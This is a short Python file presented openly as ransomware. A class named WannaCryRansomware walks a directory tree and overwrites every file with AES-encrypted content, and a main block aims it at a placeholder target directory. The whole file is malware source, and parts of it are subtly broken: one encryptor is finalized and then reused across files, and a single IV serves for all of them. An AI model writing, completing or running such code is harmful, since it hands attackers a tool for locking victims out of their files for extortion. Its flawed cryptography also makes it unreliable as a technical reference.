import os
import base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend

class WannaCryRansomware:
    def __init__(self, key):
        self.key = key
        self.iv = os.urandom(16)
        self.cipher = Cipher(algorithms.AES(self.key), modes.CFB(self.iv), backend=default_backend())
        self.encryptor = self.cipher.encryptor()
        self.decryptor = self.cipher.decryptor()

    def encrypt_file(self, file_path):
        with open(file_path, 'rb') as f:
            data = f.read()
        padder = padding.PKCS7(algorithms.AES.block_size).padder()
        padded_data = padder.update(data) + padder.finalize()
        encrypted_data = self.encryptor.update(padded_data) + self.encryptor.finalize()
        with open(file_path, 'wb') as f:
            f.write(self.iv + encrypted_data)

    def decrypt_file(self, file_path):
        with open(file_path, 'rb') as f:
            data = f.read()
        iv = data[:16]
        encrypted_data = data[16:]
        cipher = Cipher(algorithms.AES(self.key), modes.CFB(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()
        unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
        unpadded_data = unpadder.update(decrypted_data) + unpadder.finalize()
        with open(file_path, 'wb') as f:
            f.write(unpadded_data)

    def encrypt_directory(self, directory_path):
        for root, dirs, files in os.walk(directory_path):
            for file in files:
                file_path = os.path.join(root, file)
                self.encrypt_file(file_path)

    def decrypt_directory(self, directory_path):
        for root, dirs, files in os.walk(directory_path):
            for file in files:
                file_path = os.path.join(root, file)
                self.decrypt_file(file_path)

if __name__ == "__main__":
    key = os.urandom(32)  # AES-256 key
    ransomware = WannaCryRansomware(key)
    target_directory = "/path/to/target/directory"
    ransomware.encrypt_directory(target_directory)
    # To decrypt, use the same key
    ransomware.decrypt_directory(target_directory)
